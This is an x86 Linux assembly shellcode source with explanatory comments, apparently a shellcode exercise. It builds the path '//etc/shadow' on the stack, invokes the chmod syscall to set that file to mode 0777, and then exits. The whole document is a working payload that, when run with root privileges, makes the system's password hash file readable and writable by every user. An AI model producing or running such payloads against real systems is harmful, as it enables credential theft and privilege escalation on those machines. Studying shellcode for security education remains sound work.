global _start

section .text
_start:

	xor eax, eax		; clear eax

	push eax		; push the value 0 to the stack
	
	mov al, 0xf		; f is the hex value of the decimal 15 for chmod syscall

	; push 0x776f6461
	mov dword [esp-4], 0x776f6461 	; "adow" is saved to the stack

	; push 0x68732f63
	mov dword [esp-8], 0x68732f63	; "c/sh" is saved to the stack

	; push 0x74652f2f
	mov dword [esp-12], 0x74652f2f	; "//et" is saved to the stack

	sub esp, 12		; esp points at the top of the stack, where is th string "//etc/shadow"

	mov ebx, esp		; ebx now points at the string at the top of the stack

	mov cx, 0x1ff		; 1ff is the hex value for the octal 777 (permissions)

	int 0x80		; exec chmod syscall
	
	inc eax			; increment eax to 1

	int 0x80		; exec exit syscall
